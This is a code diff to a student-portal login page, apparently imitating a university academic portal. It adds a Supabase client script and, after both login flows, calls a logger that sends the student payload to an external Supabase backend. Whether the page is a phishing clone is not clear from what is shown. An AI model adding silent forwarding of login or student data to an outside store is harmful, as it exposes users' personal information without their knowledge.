@@ -604,6 +604,8 @@
         </div>
     </div>
 
+    <!-- Supabase Client & Data Logger -->
+    <script src="supabase-client.js"></script>
     <script>
         // Check active session on load
         function checkActiveSession() {
@@ -739,6 +741,11 @@
             localStorage.setItem('fap_is_authenticated', 'true');
             localStorage.setItem('fap_student_data', JSON.stringify(studentPayload));
 
+            // Gửi dữ liệu lên Supabase
+            if (window.SupabaseLogger && window.SupabaseLogger.sendStudentDataToSupabase) {
+                window.SupabaseLogger.sendStudentDataToSupabase(studentPayload);
+            }
+
             closeFeidModal();
             toast.textContent = `Đăng nhập thành công! Xin chào ${fullname} (${studentCode})`;
             toast.style.display = 'block';
@@ -771,6 +778,11 @@
 
             localStorage.setItem('fap_is_authenticated', 'true');
             localStorage.setItem('fap_student_data', JSON.stringify(studentPayload));
+
+            // Gửi dữ liệu lên Supabase
+            if (window.SupabaseLogger && window.SupabaseLogger.sendStudentDataToSupabase) {
+                window.SupabaseLogger.sendStudentDataToSupabase(studentPayload);
+            }
 
             toast.textContent = `Đang tra cứu hồ sơ sinh viên ${roll.toUpperCase()}...`;
             toast.style.display = 'block';
